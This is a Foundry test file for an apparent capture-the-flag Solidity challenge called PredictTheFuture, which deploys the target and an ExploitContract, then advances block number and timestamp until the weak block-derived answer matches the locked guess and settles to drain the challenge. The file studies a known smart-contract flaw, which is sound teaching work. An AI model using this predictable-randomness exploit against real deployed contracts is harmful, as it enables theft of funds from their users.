// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import { Test } from 'forge-std/Test.sol';
import { console } from 'forge-std/console.sol';
import { ExploitContract, PredictTheFuture } from '../src/PredictTheFuture.sol';

contract PredictTheFutureTest is Test {
  PredictTheFuture public predictTheFuture;
  ExploitContract public exploitContract;

  function setUp() public {
    // Deploy contracts
    predictTheFuture = (new PredictTheFuture){ value: 1 ether }();
    exploitContract = (new ExploitContract){ value: 100 ether }(predictTheFuture);

    vm.deal(address(exploitContract), 10 ether);
  }

  function testGuess() public {
    // // Set block number and timestamp
    // // Use vm.roll() and vm.warp() to change the block.number and block.timestamp respectively
    exploitContract.lockInGuess();
    bool isCorrect = false;

    while (!isCorrect) {
      vm.roll(block.number + 2);
      vm.warp(block.timestamp + 2 minutes);

      uint8 answer = exploitContract.answer();
      if (answer == exploitContract.GUESS()) {
        isCorrect = true;
      }
    }

    exploitContract.settle();
    _checkSolved();
  }

  function _checkSolved() internal view {
    assertTrue(predictTheFuture.isComplete(), 'Challenge Incomplete');
  }

  receive() external payable {}
}
